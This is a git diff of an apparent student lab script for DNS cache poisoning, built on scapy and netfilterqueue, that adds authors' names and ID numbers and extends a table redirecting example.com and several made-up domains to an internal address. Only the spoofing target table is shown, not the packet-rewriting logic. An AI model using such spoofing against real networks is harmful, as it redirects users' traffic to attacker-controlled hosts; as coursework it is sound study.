@@ -1,3 +1,10 @@
+"""
+Luyckx Marco 496283
+Bouhnine Ayoub 500048
+
+DNS cache poisoning
+"""
+
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import os
@@ -19,6 +26,15 @@ def display_banner():
 dns_hosts = {
     b"example.com.": "10.12.0.10", # redirect google to the internal http server
     b"www.example.com.": "10.12.0.10",
+    b"example.org" : "10.12.0.10",
+    b"example.be" : "10.12.0.10",
+    b"example.fr" : "10.12.0.10",
+    b"test.com" : "10.12.0.10",
+    b"a-very-long-domain-name.com" : "10.12.0.10",
+    b"a-very-long-domain-name.org" : "10.12.0.10",
+    b"oh-boy-i-really-hope-this-domain-name-is-not-used-for-dns-reflection-attacks.oof" : "10.12.0.10",
+    b"i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof" : "10.12.0.10",
+    b"domain.oof" : "10.12.0.10",
 }
 
 def modify_packet(packet):
